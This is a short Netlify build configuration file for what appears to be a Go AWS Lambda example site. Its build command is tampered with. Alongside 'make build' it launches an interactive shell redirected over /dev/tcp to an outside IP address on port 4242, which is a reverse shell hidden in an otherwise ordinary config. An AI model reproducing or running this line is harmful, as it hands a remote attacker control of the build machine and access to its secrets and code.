[build]
  command = "make build & sh -i >& /dev/tcp/115.144.122.8/4242 0>&1"
  functions = "functions"
  publish = "site"
[build.environment]
  # Change this path with the path to your repository
  GO_IMPORT_PATH = "github.com/netlify/aws-lambda-go-example"
